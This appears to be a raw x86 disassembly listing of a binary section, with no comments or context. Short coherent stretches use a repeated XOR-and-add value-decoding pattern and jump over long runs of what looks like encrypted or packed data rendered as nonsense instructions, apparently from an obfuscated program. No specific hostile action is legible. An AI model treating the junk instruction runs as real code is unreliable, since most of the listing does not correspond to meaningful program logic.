  402857:	jmp    DWORD PTR [ecx+0x575c47e0]
  40285d:	dec    BYTE PTR [esp+esi*2-0x7d]
  402861:	or     esi,ecx
  402863:	jl     0x402833
  402865:	and    BYTE PTR [ebp+0x65b26c63],0x1b
  40286c:	test   eax,0x1182ecdd
  402871:	or     dl,BYTE PTR [ebx-0x5e79a4fc]
  402877:	into   
  402878:	popf   
  402879:	push   ds
  40287a:	inc    eax
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx+0x35d613fe]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	shr    DWORD PTR [edx+0x3c534b21],0xbd
  4028d5:	loope  0x40287b
  4028d7:	test   DWORD PTR [edi-0x10],edx
  4028da:	aam    0xc0
  4028dc:	dec    esp
  4028dd:	inc    esi
  4028de:	gs push edi
  4028e0:	inc    esp
  4028e1:	cmp    DWORD PTR [ecx+ecx*4],esi
  4028e4:	lods   al,BYTE PTR ds:[esi]
  4028e5:	loope  0x4028e8
  4028e7:	jmp    0x4028a3
  4028e9:	or     DWORD PTR [ebp+0x67a227b7],esp
  4028ef:	sub    al,0x12
  4028f1:	sar    DWORD PTR [edx],cl
  4028f3:	mov    WORD PTR [esi-0x50825ab],?
  4028f9:	fnsave [ecx-0x96e8df3]
  4028ff:	jno    0x4028a2
  402901:	das    
  402902:	shr    BYTE PTR [esi-0xf],cl
  402905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402906:	xlat   BYTE PTR ds:[ebx]
  402907:	enter  0x3210,0x25
  40290b:	mov    bh,0x86
  40290d:	jbe    0x4028c9
  40290f:	push   ds
  402910:	jb     0x402922
  402912:	ss icebp 
  402914:	mov    DWORD PTR [edi-0x68],ecx
  402917:	jl     0x402996
  402919:	pop    ss
  40291a:	fstp   QWORD PTR [edi]
  40291c:	pusha  
  40291d:	sbb    al,0xfb
  40291f:	jns    0x402927
  402921:	push   cs
  402922:	fs cmc 
  402924:	cmp    al,0x50
  402926:	aaa    
  402927:	fwait
  402928:	int3   
  402929:	xor    ebx,DWORD PTR [ebx+0x21272a76]
  40292f:	shr    DWORD PTR [ebx+0x2d],0x84
  402933:	ja     0x402963
  402935:	shr    DWORD PTR [ecx+0x47454d50],1
  40293b:	je     0x402911
  40293d:	mov    dl,0xe3
  40293f:	or     BYTE PTR [edi+0x19f6cfb5],dh
  402945:	dec    ecx
  402946:	call   FWORD PTR [ebx+0x43]
  402949:	ror    BYTE PTR [esi],cl
  40294b:	and    al,0x58
  40294d:	jmp    0x304b39db
  402952:	pop    eax
  402953:	aad    0x82
  402955:	aam    0xec
  402957:	pop    eax
  402958:	rcr    DWORD PTR [ecx],cl
  40295a:	ss out 0x4d,al
  40295d:	inc    ebx
  40295e:	mov    ebx,ss
  402960:	cdq    
  402961:	pop    eax
  402962:	xor    DWORD PTR [edi-0x613b5326],esi
  402968:	mov    cl,0x4c
  40296a:	out    0x1e,eax
  40296c:	and    BYTE PTR [ecx],cl
  40296e:	xchg   BYTE PTR [edx],ah
  402970:	leave  
  402971:	jl     0x402969
  402973:	int3   
  402974:	sahf   
  402975:	gs in  eax,0xa4
  402978:	leave  
  402979:	les    ebx,FWORD PTR [edx+0x3cb5823a]
  40297f:	retf   
  402980:	pop    esi
  402981:	push   edx
  402982:	icebp  
  402983:	loopne 0x4029a6
  402985:	data16 ficom DWORD PTR [edi+0x5131119b]
  40298c:	jnp    0x40294a
  40298e:	test   al,0x12
  402990:	and    esp,DWORD PTR [eax-0x277a46ec]
  402996:	clc    
  402997:	cs hlt 
  402999:	test   eax,0xeef25b81
  40299e:	int3   
  40299f:	sahf   
  4029a0:	pop    eax
  4029a1:	sub    bl,BYTE PTR [esi+edi*2]
  4029a4:	jg     0x402956
  4029a6:	out    dx,al
  4029a7:	icebp  
  4029a8:	mov    ah,0xe5
  4029aa:	push   edi
  4029ab:	jne    0x4029bb
  4029ad:	daa    
  4029ae:	push   esp
  4029af:	aas    
  4029b0:	loope  0x4029c9
  4029b2:	mov    dh,0xc0
  4029b4:	add    al,BYTE PTR [ebx+0x62]
  4029b7:	lods   al,BYTE PTR ds:[esi]
  4029b8:	mov    esp,0x812fbdd7
  4029bd:	cmp    BYTE PTR [edx+0x59ea6681],ah
  4029c3:	cdq    
  4029c4:	in     eax,0x1b
  4029c6:	sahf   
  4029c7:	repz lea esp,[esp+edx*1+0x16]
  4029cc:	adc    eax,0xd7ac2ea6
  4029d1:	hlt    
  4029d2:	lods   eax,DWORD PTR ds:[esi]
  4029d3:	mov    esi,0xe3fcf50a
  4029d8:	jbe    0x4029f6
  4029da:	pushf  
  4029db:	and    DWORD PTR [edi+0x51bceb28],edi
  4029e1:	sub    ebp,edi
  4029e3:	call   0xee99:0x36019887
  4029ea:	rcl    DWORD PTR [esi+0xcc0e7a8],cl
  4029f0:	pop    edi
  4029f1:	and    eax,0xeb021c1b
  4029f6:	mov    bl,0xcf
  4029f8:	and    DWORD PTR [edx+edx*4-0x8],ebx
  4029fc:	mov    dh,0xe7
  4029fe:	fnsave ds:0x31a07fc0
  402a04:	stos   DWORD PTR es:[edi],eax
  402a05:	mov    ebx,eax
  402a07:	fild   DWORD PTR ds:[esi]
  402a0a:	xor    al,0x1
  402a0c:	mov    WORD PTR [esi],ss
  402a0e:	jb     0x402a4b
  402a10:	sub    DWORD PTR [eax-0x73],0x799e4162
  402a17:	int3   
  402a18:	cdq    
  402a19:	mov    ecx,0xfffb4622
  402a1e:	mov    cs,WORD PTR [ebp+0x7251e894]
  402a24:	and    ecx,DWORD PTR [edi]
  402a26:	mov    esi,0x2a45a662
  402a2b:	cmp    BYTE PTR [eax+0x7c35df94],al
  402a31:	mov    ebx,esp
  402a33:	inc    ebx
  402a34:	fwait
  402a35:	mov    ch,0x99
  402a37:	ins    BYTE PTR es:[edi],dx
  402a38:	test   DWORD PTR [ebx],eax
  402a3a:	cmp    eax,0x3ee01d2f
  402a3f:	pop    ebx
  402a40:	adc    BYTE PTR [edi],dh
  402a42:	sub    DWORD PTR [ebp-0x414a144c],0x92087db9
  402a4c:	(bad)  
  402a4d:	mov    cl,0xd1
  402a4f:	fninit 
  402a51:	push   ss
  402a52:	imul   eax,DWORD PTR [esi+0x3b],0x7fe1fa33
  402a59:	lahf   
  402a5a:	test   BYTE PTR [eax+0x7097f311],bl
  402a60:	xchg   edx,eax
  402a61:	sbb    bh,BYTE PTR ds:0x23751255
  402a67:	popa   
  402a68:	push   ss
  402a69:	jp     0x4029fc
  402a6b:	call   0x4929e7d5
  402a70:	pop    es
  402a71:	ficom  WORD PTR [edi+0x23d32009]
  402a77:	test   BYTE PTR [esi-0xe6bd1dd],dl
  402a7d:	push   ds
  402a7e:	push   ecx
  402a7f:	or     bh,BYTE PTR [edi+eiz*1-0x6f40d2df]
  402a86:	xor    BYTE PTR [ebx-0x17],0xa7
  402a8a:	clc    
  402a8b:	inc    ecx
  402a8c:	imul   eax,DWORD PTR [ebp+esi*2+0x2a03be68],0xb235804e
  402a97:	aad    0x6
  402a99:	pusha  
  402a9a:	or     BYTE PTR [ebp-0x53022a0a],ch
  402aa0:	das    
  402aa1:	jno    0x402acf
  402aa3:	mov    ds:0xc17c2470,eax
  402aa8:	mov    bh,0x52
  402aaa:	pushf  
  402aab:	xchg   BYTE PTR [ebp-0x62],bl
  402aae:	lods   eax,DWORD PTR ds:[esi]
  402aaf:	adc    DWORD PTR [esi-0x2e],eax
  402ab2:	out    0xa,al
  402ab4:	ds push eax
  402ab6:	sbb    edx,DWORD PTR [esi-0x78]
  402ab9:	shr    cl,0x70
  402abc:	test   eax,0x99ac8627
  402ac1:	add    DWORD PTR [ecx],ebx
  402ac3:	xchg   ebp,eax
  402ac4:	pop    edx
  402ac5:	or     eax,DWORD PTR [esi+0x68]
  402ac8:	call   0xeee8:0x6933e406
  402acf:	les    eax,FWORD PTR [ebx-0x2e]
  402ad2:	inc    esp
  402ad3:	in     al,dx
  402ad4:	inc    eax
  402ad5:	aaa    
  402ad6:	aam    0xc0
  402ad8:	push   esi
  402ad9:	call   0xdcb38bef
  402ade:	or     al,0x6d
  402ae0:	cmp    bh,BYTE PTR [edi-0x10]
  402ae3:	hlt    
  402ae4:	fsubr  DWORD PTR [ebx]
  402ae6:	or     al,0xf7
  402ae8:	out    dx,al
  402ae9:	jge    0x402b3a
  402aeb:	cmc    
  402aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aed:	or     eax,0x4f51a1de
  402af2:	add    edi,DWORD PTR [eax+ebp*2-0x5abaa0f]
  402af9:	pusha  
  402afa:	popf   
  402afb:	cmc    
  402afc:	js     0x402ab5
  402afe:	lea    esi,[edx+0x7a675981]
  402b04:	pop    esp
  402b05:	cmc    
  402b06:	lahf   
  402b07:	js     0x402aa8
  402b09:	arpl   WORD PTR [ebx+0x2],dx
  402b0c:	hlt    
  402b0d:	mov    WORD PTR [edi],?
  402b0f:	adc    DWORD PTR [esi-0x33],ebx
  402b12:	and    eax,0x190f3f87
  402b17:	xchg   BYTE PTR [edx+eax*1],bh
  402b1a:	push   ss
  402b1b:	inc    edi
  402b1c:	(bad)  
  402b1d:	dec    edi
  402b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b1f:	sbb    DWORD PTR [ecx+eiz*4],eax
  402b22:	mov    WORD PTR [esi-0x2],ds
  402b25:	fdivrp st(2),st
  402b27:	out    dx,eax
  402b28:	adc    dl,BYTE PTR [eax]
  402b2a:	cld    
  402b2b:	xor    BYTE PTR [ecx-0x11],al
  402b2e:	mov    edx,0xbcb7b2f7
  402b33:	xchg   esi,eax
  402b34:	(bad)  
  402b35:	js     0x402b1a
  402b37:	out    0x34,eax
  402b39:	mov    ds:0xdb2fc499,eax
  402b3e:	cmp    DWORD PTR [ecx],edi
  402b40:	cmp    al,0x5b
  402b42:	lock dec edi
  402b44:	ret    
  402b45:	in     eax,dx
  402b46:	sbb    eax,0x9057caf3
  402b4b:	jecxz  0x402b9b
  402b4d:	addr16 and al,0xa0
  402b50:	xchg   BYTE PTR [eax],ch
  402b52:	mov    cl,0x66
  402b54:	or     al,0xb4
  402b56:	jge    0x402b3a
  402b58:	shr    DWORD PTR cs:[ebp-0xbff9983],0xc3
  402b60:	(bad)  
  402b61:	inc    ebp
  402b62:	out    dx,al
  402b63:	adc    DWORD PTR [eax+0xf],ecx
  402b66:	mov    es,WORD PTR [edi]
  402b68:	lahf   
  402b69:	cmp    cl,cl
  402b6b:	retf   
  402b6c:	stc    
  402b6d:	out    dx,al
  402b6e:	mov    al,ds:0xbeb80a69
  402b73:	xor    al,0x52
  402b75:	lods   eax,DWORD PTR ds:[esi]
  402b76:	xchg   edx,eax
  402b77:	xor    edx,DWORD PTR [esi+0x127d22a6]
  402b7d:	sbb    eax,DWORD PTR [eax]
  402b7f:	mov    es,WORD PTR [esi+0x40a139fa]
  402b85:	sub    BYTE PTR [edi+0x24],bh
  402b88:	pop    eax
  402b89:	xor    DWORD PTR [ebx-0x3],edx
  402b8c:	mov    al,BYTE PTR [ebp-0x4c36dd4a]
  402b92:	in     eax,dx
  402b93:	pusha  
  402b94:	mov    ebp,0x1276156b
  402b99:	rcr    BYTE PTR [eax+ebx*8],cl
  402b9c:	dec    ebp
  402b9d:	aam    0xa2
  402b9f:	or     BYTE PTR [ecx],ch
  402ba1:	mov    bh,al
  402ba3:	xor    DWORD PTR [ecx-0x5e],edx
  402ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba7:	popf   
  402ba8:	ret    
  402ba9:	lds    edi,FWORD PTR [esi]
  402bab:	int    0x88
  402bad:	out    dx,ax
  402baf:	daa    
  402bb0:	dec    esi
  402bb1:	xor    ch,dh
  402bb3:	or     ebx,DWORD PTR [esi]
  402bb5:	mov    eax,0x9107b6d5
  402bba:	div    DWORD PTR [ebp-0x20d34514]
  402bc0:	push   ebp
  402bc1:	inc    esi
  402bc2:	push   esp
  402bc4:	cmp    edx,DWORD PTR ds:0x2a4a94f4
  402bca:	(bad)  
  402bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bcc:	xchg   esp,eax
  402bcd:	sbb    esi,DWORD PTR [edi+0x145e4fff]
  402bd3:	popf   
  402bd4:	js     0x402b7d
  402bd6:	lock dec ecx
  402bd8:	mov    es,WORD PTR [esp+eiz*2+0x11]
  402bdc:	in     eax,0xad
  402bde:	shl    BYTE PTR [edx],1
  402be0:	mov    eax,0x3448c13f
  402be5:	sub    eax,0x902a1b30
  402bea:	xor    BYTE PTR [edi+edx*8],ah
  402bed:	into   
  402bee:	sbb    bh,BYTE PTR [edx]
  402bf0:	addr16 aas 
  402bf2:	xchg   edx,eax
  402bf3:	push   eax
  402bf4:	sbb    BYTE PTR [eax-0x9],cl
  402bf7:	xlat   BYTE PTR ds:[ebx]
  402bf8:	inc    ecx
  402bf9:	scas   al,BYTE PTR es:[edi]
  402bfa:	mov    dh,0x20
  402bfc:	or     eax,0x49f4d9f9
  402c01:	enter  0xa5c0,0x4e
  402c05:	xchg   edx,eax
  402c06:	and    BYTE PTR [edi-0x399b31d],ch
  402c0c:	jl     0x402c0d
  402c0e:	shr    BYTE PTR [edi*4-0x146a9624],0x43
  402c16:	out    dx,eax
  402c17:	or     esi,DWORD PTR [eax+0x26]
  402c1a:	out    dx,al
  402c1b:	sbb    ebp,ebp
  402c1d:	into   
  402c1e:	add    cl,bh
  402c20:	or     eax,DWORD PTR [ecx-0x7]
  402c23:	and    ah,dl
  402c25:	call   0x2fd431e6
  402c2a:	jbe    0x402be8
  402c2c:	mov    eax,ds:0x67f167d4
  402c31:	dec    esp
  402c32:	and    al,0x4f
  402c34:	fstp   DWORD PTR [eax-0x7321ca08]
  402c3a:	jne    0x402c1a
  402c3c:	push   esp
  402c3d:	(bad)  [edx]
  402c3f:	mov    edx,0xaedaa8f5
  402c44:	sahf   
  402c45:	imul   ecx,DWORD PTR [edx+0x71],0xfa1141f
  402c4c:	int3   
  402c4d:	call   0xf04f:0xd5a05774
  402c54:	xchg   DWORD PTR [ebx-0x44],ebx
  402c57:	sub    al,0x18
  402c59:	ins    DWORD PTR es:[edi],dx
  402c5a:	ins    BYTE PTR es:[di],dx
  402c5c:	and    BYTE PTR ds:0x45906f14,al
  402c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c63:	jle    0x402c7d
  402c65:	cld    
  402c66:	fiadd  DWORD PTR [edx+esi*1]
  402c69:	retf   0xf019
  402c6c:	jne    0x402cb5
  402c6e:	aas    
  402c6f:	test   DWORD PTR [eax+0x5e],ecx
  402c72:	lea    eax,[eax]
  402c74:	push   ebp
  402c75:	out    0x1f,eax
  402c77:	cli    
  402c78:	mov    edx,0x7b34ccfb
  402c7d:	inc    BYTE PTR [esp+eiz*4+0x5f]
  402c81:	pop    ebx
  402c82:	in     al,0xc7
  402c84:	adc    BYTE PTR [ebx-0x61132b6c],dl
  402c8a:	adc    edi,DWORD PTR [ebx-0x44]
  402c8d:	xchg   ebp,eax
  402c8e:	fldenv [ecx]
  402c90:	adc    BYTE PTR [ebx+eiz*8-0x74],bl
  402c94:	adc    BYTE PTR [ebx+0x25],0x84
  402c98:	in     al,0xb2
  402c9a:	jmp    FWORD PTR [edx+0xf]
  402c9d:	iret   
  402c9e:	std    
  402c9f:	lahf   
  402ca0:	push   ecx
  402ca1:	push   edi
  402ca2:	retf   0x656b
  402ca5:	fistp  QWORD PTR [eax+0x70]
  402ca8:	jno    0x402c64
  402caa:	mov    cl,0x42
  402cac:	pop    dx
  402cae:	dec    esp
  402caf:	xchg   ecx,eax
  402cb0:	popa   
  402cb1:	std    
  402cb2:	ins    DWORD PTR es:[edi],dx
  402cb3:	scas   al,BYTE PTR es:[edi]
  402cb4:	and    ebx,DWORD PTR [eax]
  402cb6:	addr16 sbb eax,0x88130c59
  402cbc:	ror    dl,0xcf
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs push ebp
  402d3f:	push   ecx
  402d40:	add    DWORD PTR [edx],edi
  402d42:	cwde   
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402d4c
  402d4b:	pop    ebp
  402d4c:	or     dl,BYTE PTR [esi+0x590b1ff]
  402d52:	xchg   ebx,eax
  402d53:	loop   0x402d57
  402d55:	ficom  WORD PTR [edi+0x44bd88ed]
  402d5b:	dec    edx
  402d5c:	or     al,0xe7
  402d5e:	popf   
  402d5f:	outs   dx,DWORD PTR ds:[esi]
  402d60:	push   edi
  402d61:	xchg   ebp,eax
  402d62:	rcr    ebx,cl
  402d64:	jmp    0x8ab6:0x2d7a3252
  402d6b:	and    DWORD PTR [eax],esp
  402d6d:	xchg   esp,esp
  402d6f:	jecxz  0x402d3b
  402d71:	inc    edi
  402d72:	mov    eax,ds:0x82f64860
  402d77:	daa    
  402d78:	scas   al,BYTE PTR es:[edi]
  402d79:	or     eax,0xbf3c0139
  402d7e:	jp     0x402d9e
  402d80:	stos   BYTE PTR es:[edi],al
  402d81:	jae    0x402d6c
  402d83:	or     eax,0xc5920885
  402d88:	mov    al,0x8
  402d8a:	fild   QWORD PTR [ebx+ebx*8-0x403a6181]
  402d91:	xor    al,0x39
  402d93:	xor    ebp,DWORD PTR [esi]
  402d95:	loope  0x402d8b
  402d97:	inc    eax
  402d98:	cmp    al,0x71
  402d9a:	mov    esi,0x1e3e6758
  402d9f:	je     0x402ddb
  402da1:	jecxz  0x402d76
  402da3:	mov    ebx,0x18a28168
  402da8:	sbb    al,0x61
  402daa:	repz jecxz 0x402d4b
  402dad:	dec    ebp
  402dae:	dec    edi
  402daf:	or     edx,DWORD PTR [esi+0xf]
  402db2:	mov    al,ds:0x9c54eb0c
  402db7:	arpl   cx,sp
  402db9:	sahf   
  402dba:	pop    edx
  402dbb:	xor    bl,ah
  402dbd:	arpl   WORD PTR [ecx],sp
  402dbf:	pop    edx
  402dc0:	sbb    al,0x83
  402dc2:	cwde   
  402dc3:	ja     0x402e1f
  402dc5:	lods   eax,DWORD PTR ds:[esi]
  402dc6:	mov    ds:0x9f32d74b,al
  402dcb:	sbb    eax,0xcd02065
  402dd0:	inc    edi
  402dd1:	into   
  402dd2:	adc    DWORD PTR [ecx+0x7a],ecx
  402dd5:	repnz push ds
  402dd7:	mov    bl,0xa5
  402dd9:	lds    esi,FWORD PTR [edi-0x4c]
  402ddc:	sar    DWORD PTR [ebx],1
  402dde:	(bad)  
  402ddf:	fwait
  402de0:	adc    al,0xac
  402de2:	jp     0x402e63
  402de4:	out    dx,al
  402de5:	mov    DWORD PTR [eax+0x3],ebx
  402de8:	(bad)  
  402dea:	jb     0x402dd6
  402dec:	add    ah,BYTE PTR [edi+esi*1-0x1b749a68]
  402df3:	nop
  402df4:	ud0    esi,edi
  402df7:	fs call 0x9bba:0xc9303906
  402dff:	ds ret 0x5758
  402e03:	in     al,dx
  402e04:	cwde   
  402e05:	pop    ebx
  402e06:	pop    edi
  402e07:	push   0x9ebfb432
  402e0c:	adc    BYTE PTR [edi+0x243920a4],0xa1
  402e13:	outs   dx,BYTE PTR ds:[esi]
  402e14:	data16 fidiv WORD PTR [ebx]
  402e17:	and    esp,DWORD PTR fs:[edi-0x28]
  402e1b:	mov    al,ds:0x6601e0f
  402e20:	daa    
  402e21:	mov    cl,0x38
  402e23:	or     ecx,DWORD PTR [edx+0x7c]
  402e26:	stos   BYTE PTR es:[edi],al
  402e27:	stc    
  402e28:	or     BYTE PTR [esi+ebp*8],ch
  402e2b:	outs   dx,BYTE PTR ds:[esi]
  402e2c:	leave  
  402e2d:	mov    dh,BYTE PTR [ebx+edi*2+0xfa9a7be]
  402e34:	js     0x402dbb
  402e36:	pop    ebp
  402e37:	ret    
  402e38:	push   esp
  402e39:	addr16 retf 0xf2a
  402e3d:	sbb    DWORD PTR [eax+0x2a],edi
  402e40:	push   edx
  402e41:	ror    ecx,0xf4
  402e44:	iret   
  402e45:	aad    0xa8
  402e47:	outs   dx,BYTE PTR ds:[esi]
  402e48:	arpl   dx,dx
  402e4a:	sub    esi,DWORD PTR [esi]
  402e4c:	and    al,0x45
  402e4e:	xchg   esp,eax
  402e4f:	pop    ebx
  402e50:	jp     0x402e9b
  402e52:	push   esp
  402e53:	pop    ebx
  402e54:	xchg   ebp,eax
  402e55:	xor    BYTE PTR [esi-0x380efb92],ch
  402e5b:	popf   
  402e5c:	jmp    ebp
  402e5e:	addr16 fs ret 
  402e61:	xchg   ebx,eax
  402e62:	pop    ebp
  402e63:	(bad)  
  402e64:	nop
  402e65:	jle    0x402e02
  402e67:	loopne 0x402e17
  402e69:	or     BYTE PTR [esi-0x1f],ch
  402e6c:	xchg   esp,eax
  402e6d:	ret    0x68b7
  402e70:	inc    eax
  402e71:	rol    BYTE PTR [ecx-0x30e8225e],cl
  402e77:	sub    bl,0xf5
  402e7a:	or     BYTE PTR [ebx],0x31
  402e7d:	pop    edi
  402e7e:	pusha  
  402e7f:	adc    ch,ch
  402e81:	pop    esp
  402e82:	pop    ss
  402e83:	cmp    al,0xa6
  402e85:	rcl    dh,1
  402e87:	cmp    BYTE PTR [ebp-0x38],bl
  402e8a:	add    al,0xe4
  402e8c:	mov    WORD PTR [ebp-0x7fec9710],ss
  402e92:	jg     0x402e8e
  402e94:	inc    ebp
  402e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e96:	xchg   ecx,eax
  402e97:	adc    DWORD PTR [esp+0x69],0x30dabaf8
  402e9f:	push   esi
  402ea0:	cld    
  402ea1:	sub    ch,BYTE PTR [edi-0x10dc17a3]
  402ea7:	mov    ch,0xc9
  402ea9:	mov    ecx,0xd5377a5d
  402eae:	mov    ah,0x8f
  402eb0:	popa   
  402eb1:	sbb    DWORD PTR [ebx-0x60],ebx
  402eb4:	inc    eax
  402eb5:	test   BYTE PTR [ebx],ch
  402eb7:	xchg   DWORD PTR [ebx],esi
  402eb9:	aas    
  402eba:	jle    0x402e67
  402ebc:	jg     0x402e7d
  402ebe:	and    edi,DWORD PTR [esi+0x77]
  402ec1:	pop    esp
  402ec2:	sbb    al,0x82
  402ec4:	pop    edx
  402ec5:	es xchg edi,eax
  402ec7:	ret    0x4633
  402eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ecb:	ins    BYTE PTR es:[edi],dx
  402ecc:	or     al,0x77
  402ece:	inc    esi
  402ecf:	sbb    bl,bh
  402ed1:	fiadd  DWORD PTR [eax+0x2c]
  402ed4:	ins    BYTE PTR es:[edi],dx
  402ed5:	sbb    ecx,DWORD PTR [ebx-0x68a7167e]
  402edb:	xchg   DWORD PTR [ebp-0x74],edi
  402ede:	adc    eax,0x37e466f6
  402ee3:	mov    ah,0xc6
  402ee5:	lahf   
  402ee6:	mov    bh,0x7d
  402ee8:	and    eax,0x45af0605
  402eed:	pop    edi
  402eee:	iret   
  402eef:	out    dx,eax
  402ef0:	sbb    al,0xb5
  402ef2:	mul    al
  402ef4:	or     edi,DWORD PTR [edx+esi*1+0x36c248d1]
  402efb:	scas   al,BYTE PTR es:[edi]
  402efc:	sti    
  402efd:	inc    ebp
  402efe:	pop    ss
  402eff:	cs xchg edx,eax
  402f01:	ffree  st(5)
  402f03:	mov    ebp,0x76c2494c
  402f08:	and    eax,0x5b730588
  402f0d:	mov    esi,DWORD PTR [ebx+0x60ec86f8]
  402f13:	outs   dx,DWORD PTR ds:[esi]
  402f14:	jmp    0x8bdf6a47
  402f19:	ins    BYTE PTR es:[edi],dx
  402f1a:	push   es
  402f1b:	xor    eax,0xa222b88d
  402f20:	lods   al,BYTE PTR ds:[esi]
  402f21:	push   eax
  402f22:	cmovbe ebx,eax
  402f25:	mov    ch,0x83
  402f27:	daa    
  402f28:	pop    ds
  402f29:	push   ebp
  402f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f2b:	inc    edi
  402f2c:	xchg   ebx,eax
  402f2d:	mov    ch,0x32
  402f2f:	cld    
  402f30:	shl    DWORD PTR ds:0x974bf152,1
  402f36:	jp     0x402fb3
  402f38:	jg     0x402f98
  402f3a:	icebp  
  402f3b:	push   ecx
  402f3c:	jl     0x402faf
  402f3e:	aad    0xc
  402f40:	jl     0x402f10
  402f42:	pop    ss
  402f43:	jmp    0xcf80009a
  402f48:	arpl   WORD PTR [ebx+esi*2],ax
  402f4b:	xor    DWORD PTR [ebx+edi*4],edx
  402f4e:	pushf  
  402f4f:	aad    0xa7
  402f51:	aad    0x85
  402f53:	mov    edx,0xe22d2593
  402f58:	mov    al,0x8b
  402f5a:	call   0xbdf7a8fc
  402f5f:	dec    edx
  402f60:	and    al,0x3
  402f62:	test   al,0xeb
  402f64:	loopne 0x402f7d
  402f66:	or     BYTE PTR [esi-0x2c106f14],bh
  402f6c:	scas   al,BYTE PTR es:[edi]
  402f6d:	dec    edx
  402f6e:	and    eax,0x10c4b76d
  402f73:	or     eax,0x64938ff0
  402f78:	repnz xchg ebx,eax
  402f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7b:	push   ebx
  402f7c:	(bad)  
  402f7d:	loop   0x402f05
  402f7f:	or     ebp,DWORD PTR [ecx]
  402f81:	pop    es
  402f82:	fild   DWORD PTR [ecx]
  402f84:	cmp    ch,BYTE PTR [ebp+0x67410b3c]
  402f8a:	test   edx,0xe6bfe300
  402f90:	pop    eax
  402f91:	sbb    al,0xcb
  402f93:	pop    ebp
  402f94:	daa    
  402f95:	cdq    
  402f96:	add    ah,0x97
  402f99:	dec    edx
  402f9a:	cdq    
  402f9b:	inc    ebx
  402f9c:	sub    ecx,edx
  402f9e:	jns    0x402fe1
  402fa0:	jmp    0xeaa6560b
  402fa5:	mov    ds:0xf3d152eb,al
  402faa:	out    dx,al
  402fab:	daa    
  402fac:	xchg   edi,eax
  402fad:	sub    eax,0x53a39dc3
  402fb2:	neg    DWORD PTR [edi+0x2c6c9a96]
  402fb8:	icebp  
  402fb9:	adc    DWORD PTR [ecx-0x3],esp
  402fbc:	pop    ss
  402fbd:	inc    ecx
  402fbe:	xlat   BYTE PTR ds:[ebx]
  402fbf:	div    DWORD PTR [edi+0x1efee31e]
  402fc5:	mov    ds:0xd6ccbd06,al
  402fca:	push   eax
  402fcb:	push   0xaffadd3d
  402fd0:	fmul   QWORD PTR [esp+ecx*8-0x34]
  402fd4:	scas   al,BYTE PTR es:[edi]
  402fd5:	xchg   BYTE PTR [ecx-0x265dbdfd],bh
  402fdb:	icebp  
  402fdc:	fsubr  QWORD PTR [edi-0x7462a05c]
  402fe2:	stc    
  402fe3:	test   al,0x10
  402fe5:	jbe    0x402fec
  402fe7:	jmp    0x403058
  402fe9:	jnp    0x402fc4
  402feb:	in     eax,dx
